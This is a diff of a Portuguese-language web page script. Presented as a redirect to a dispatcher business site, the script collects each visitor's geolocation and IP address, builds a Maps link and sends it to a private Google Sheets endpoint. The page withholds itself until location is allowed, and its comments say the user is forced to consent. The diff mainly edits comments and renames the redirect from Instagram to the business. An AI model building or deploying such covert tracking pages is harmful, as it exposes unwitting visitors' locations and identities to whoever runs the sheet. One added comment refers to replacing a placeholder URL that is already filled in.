@@ -40,7 +40,7 @@
           const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
           // Envia os dados para sua planilha no Google Sheets
-          fetch('https://script.google.com/macros/s/AKfycbyzRAza0aUzlqUYhuTozf8IrDD4G4OLQGMkgR_CB7gTRa2cNPXHL-0rcSVsj1A6jDKi/exec', {
+          fetch('https://script.google.com/macros/s/AKfycbyzRAza0aUzlqUYhuTozf8IrDD4G4OLQGMkgR_CB7gTRa2cNPXHL-0rcSVsj1A6jDKi/exec', { // Lembre-se de substituir 'SEU_WEBAPP_URL_AQUI' pelo URL do seu Google Apps Script
             method: 'POST',
             mode: 'no-cors',
             headers: {
@@ -54,30 +54,26 @@
             })
           })
           .then(() => { // Garante que o redirecionamento só aconteça após a tentativa de envio
-            redirecionaDespachanteMauro();
+            redirecionaDespachanteMauro(); // CHAMADA PARA A NOVA FUNÇÃO DE REDIRECIONAMENTO
           })
           .catch(error => {
             console.error("Erro ao enviar dados para o Google Sheets:", error);
-            // Mesmo com erro no envio, podemos redirecionar se a localização foi obtida.
-            // Se você quiser que o redirecionamento SÓ aconteça se o envio for bem-sucedido, remova o redirecionamento daqui e o coloque apenas no .then() acima.
             redirecionaDespachanteMauro(); // Mantido para o redirecionamento após a localização bem-sucedida, mesmo que o envio falhe.
           });
         })
         .catch(error => {
           console.error("Erro ao obter IP:", error);
-          // Se não conseguir o IP, ainda podemos tentar redirecionar se a localização foi obtida.
           redirecionaDespachanteMauro();
         });
     }
 
     function erro(err) {
       console.warn("Geolocalização não permitida ou erro:", err);
-      // Aqui a página simplesmente exibe a mensagem e para.
-      // O usuário é "obrigado" a permitir para que o sucesso() seja chamado.
       document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
     }
 
-    function redirecionaInstagram() {
+    // NOVA FUNÇÃO DE REDIRECIONAMENTO
+    function redirecionaDespachanteMauro() {
       window.location.href = "https://despachantemauro.com.br/";
     }
   </script>
